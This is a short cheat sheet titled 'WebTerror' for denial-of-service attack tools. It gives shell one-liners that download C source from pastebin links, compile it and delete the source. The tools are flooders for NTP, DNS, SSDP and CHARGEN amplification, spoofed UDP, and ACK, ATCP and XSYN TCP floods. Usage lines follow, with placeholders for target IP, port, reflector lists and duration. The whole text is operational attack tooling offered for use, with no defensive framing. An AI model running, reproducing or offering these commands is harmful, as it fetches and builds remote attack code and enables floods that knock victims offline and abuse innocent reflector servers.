# WebTerror

### SSDP

wget http://pastebin.com/raw/fcyCGWqw -O ntp.c; gcc ntp.c -pthread -o ntp; rm -rf ntp.c; chmod +x ntp
wget http://pastebin.com/raw/2Hn2EejR -O dns.c; gcc dns.c -pthread -o dns; rm -rf dns.c; chmod +x dns
wget http://pastebin.com/raw/vpbXuKVA -O ssdp.c; gcc ssdp.c -pthread -o ssdp; rm -rf ssdp.c; chmod +x ssdp
wget http://pastebin.com/raw/Kktvq2pz -O chargen.c; gcc chargen.c -pthread -o chargen; rm -rf chargen.c; chmod +x chargen
wget http://pastebin.com/raw/x2eanwSi -O sudp.c; gcc sudp.c -pthread -o sudp; rm -rf sudp.c; chmod +x sudp
wget http://pastebin.com/raw/2R8URser -O ack.c; gcc ack.c -pthread -o ack; rm -rf ack.c; chmod +x ack
wget http://pastebin.com/raw/4FL9kAxx -O atcp.c; gcc atcp.c -pthread -o atcp; rm -rf atcp.c; chmod +x atcp
wget http://pastebin.com/raw/2CfHqZj9 -O xsyn.c; gcc xsyn.c -pthread -o xsyn; rm -rf xsyn.c; chmod +x xsyn

UDP

NTP
./ntp IP PORT NTPAMP.txt 8 -1 TIME
DNS
./dns IP PORT DNSAMP.txt 8 -1 TIME
SSDP
./ssdp IP PORT SSDPAMP.txt 8 -1 TIME
CHARGEN
./chargen IP PORT CHARGENAMP.txt 8 -1 TIME
Spoofed UDP / SUDP
./sudp IP PORT 8 -1 TIME

TCP

ACK
./ack IP PORT 8 -1 TIME
ATCP
./atcp IP 8 -1 TIME
XSYN
./xsyn IP PORT 8 -1 TIME
